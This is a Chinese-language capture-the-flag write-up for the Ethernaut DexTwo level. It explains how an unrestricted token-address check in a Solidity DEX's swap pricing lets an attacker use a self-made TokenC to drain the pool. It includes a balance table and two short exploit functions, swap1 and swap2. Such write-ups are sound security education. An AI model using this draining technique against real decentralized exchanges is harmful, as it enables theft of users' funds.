# DexTwo

## Reference
[DexTwo](https://ethernaut.openzeppelin.com/level/23)

[DexTwo.sol](https://github.com/yuhuajing/ethernaut-book/blob/main/src/23-DexTwo/DexTwo.sol)

## 目标
1. 玩家持有`TokenA，TokenB`各10个
2. Dex持有`TokenA，TokenB`各100个
3. 榨干Dex池子中的 `TokenA` 或 `TokenB`

## 分析
### price
```solidity
    function getSwapPrice(
    address from,
    address to,
    uint256 amount
) public view returns (uint256) {
    return ((amount * IERC20(to).balanceOf(address(this))) /
        IERC20(from).balanceOf(address(this)));
}
```
1. 在兑换Token时，通过 from/to 地址的Token数量锚定价格
2. from/to 地址不可控
 
   | playerTokenA | playerTokenB | playerTokenC | DexTokenA | DexTokenB | DexTokenC |
   |--------------|--------------|--------------|-----------|-----------|-----------|
   | 10           | 10           | 300          | 100       | 100       | 100       |
   | 110          | 10           | 200          | 0         | 100       | 200       |
   | 110          | 110          | 0            | 0         | 0         | 300       |
3. 按照上述兑换表格，最后会清空 `Dex` 池子中的 `TokenA`，攻击者的 `(TokenA,TokenB)` 的余额从(10,10)更新为(110，110)
4. 攻击swap1: 通过TokenC 兑换 TokenA
```solidity
    function swap1() public {
        dex.swap(address(tokenC), address(tokenA), 100);
    }
```
5. 攻击swap2: 通过TokenC 兑换 TokenB
```solidity
    function swap2() public {
        dex.swap(address(tokenC), address(tokenB), 200);
    }
```
